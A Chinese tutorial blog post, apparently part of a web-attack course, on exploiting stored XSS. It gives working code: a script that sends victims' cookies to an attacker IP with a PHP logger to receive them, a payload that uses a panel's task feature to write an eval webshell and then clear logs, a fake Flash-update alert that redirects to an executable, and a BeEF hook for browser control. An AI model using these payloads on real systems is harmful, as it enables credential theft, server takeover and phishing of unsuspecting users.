---
title: WebSec0x09
published: 2026-06-29T12:00:00
description: 通过注入恶意脚本盗取用户Cookie等敏感凭证，在无法获取凭证时模拟业务请求执行未授权操作或写入后门，以及利用弹窗诱导等手段结合钓鱼页面或BeEF框架实现对目标浏览器的远程控制。内容覆盖了从手工代码构造到XSSReceiver、BeEF等平台工具的使用
tags:
  - Web攻防
  - XSS
category: 网络安全
draft: false
---

# 知识点

1. Web攻防-XSS跨站-手工代码&框架工具&在线平台
2. Web攻防-XSS跨站-Cookie盗取&数据提交&网络钓鱼

# XSS跨站-攻击利用-凭据盗取

条件：无防护Cookie凭据获取

利用：XSS平台或手写接受代码

演示：某贷款分配系统存储XSS利用

手工：

拼接一个恶意请求的URL，window.location.href = 当前页面的完整网址、document.cookie = 当前用户的Cookie（包含登录凭证）。

创建一个图片标签，把src设为上面拼接好的URL，浏览器加载这张“图片”时，实际上会向攻击者的服务器发起一个GET请求，请求中携带了用户的Cookie和当前页面地址。

```js
// 目标上插入的XSS
<script>var url='http://xx.xx.xx.xx/getcookie.php?u='+window.location.href+'&c='+document.cookie;document.write("<img src="+url+" />");</script>
```

接收：

接收前端传来的参数 u（页面地址）

接收前端传来的参数 c（用户Cookie）

打开（或创建）cookie.txt文件，以追加模式写入

把数据和Cookie写入文件，每条记录占一行

关闭文件

```php
// 攻击者服务器上接收脚本
<?php
$url=$_GET['u'];
$cookie=$_GET['c'];
$fp = fopen('cookie.txt',"a");
fwrite($fp,$url."|".$cookie."\n");
fclose($fp);
?>
```

平台：XSSReceiver

简单配置即可使用，无需数据库，无需其他组件支持

搭建：https://github.com/epoch99/BlueLotus_XSSReceiver-master

# XSS跨站-攻击利用-数据提交

条件：熟悉后台业务功能数据包，利用JS写一个模拟提交

利用：凭据获取不到或有防护无法利用凭据进入时执行其他

演示：小皮面板系统存储XSS提交数据包模拟写入后门文件

参考：blog.csdn.net/RestoreJustice/article/details/129735449

攻击者知道目标网站使用了什么源码，就可以自己本地部署 一套同样的源码，在登录本地后台对后台一些业务功能(例如用户创建等)进行操作并截取其数据包，利用JS写一个模拟提交，当目标执行这个js就会执行攻击者想要的操作(用户创建等)

```js
// poc1.js
function poc(){
$.get('/service/app/tasks.php?type=task_list',{},function(data){
    var id=data.data[0].ID;
$.post('/service/app/tasks.php?type=exec_task',{
tid:id
    },function(res2){
$.post('/service/app/log.php?type=clearlog',{
            
        },function(res3){},"json");
        
      
    },"json");
  },"json");
}
function save(){
  var data=new Object();
data.task_id="";
data.title="test";
data.exec_cycle="1";
data.week="1";
data.day="3";
data.hour="14";
data.minute = "20";
data.shell='echo "<?php @eval($_POST[123]);?>" >C:/xp.cn/www/wwwroot/admin/localhost_80/wwwroot/1.php';
$.post('/service/app/tasks.php?type=save_shell',data,function(res){
    poc(); 
  },'json');
}
save();
```

# XSS跨站-攻击利用-网络钓鱼

1. 部署可访问的钓鱼页面并修改
2. 植入XSS代码等待受害者触发
3. 将后门及正常文件捆绑打包免杀

Ps：可在后续红队钓鱼篇章学习钓鱼页面制作

https://github.com/r00tSe7en/Fake-flash.cn

```js
<script>alert('当前浏览器Flash版本过低,请下载升级！');location.href='http://x.x.x.x/flash.exe'</script>
```

# XSS跨站-攻击利用-溯源综合

浏览器控制框架-beef-xss

只需执行JS文件，即可实现对当前浏览器的控制，可配合各类手法利用

演示：阿里云 Ubuntu 16.04 x64(按量计费) HK香港服务器

apt update

apt install docker

apt install docker-compose

搭建：docker run --rm -p 3000:3000 janes/beef

访问：http://ip/ui/panel （账号密码：beef/beef）

利用：

```js
<script src="http://ip:3000/hook.js"></script>
```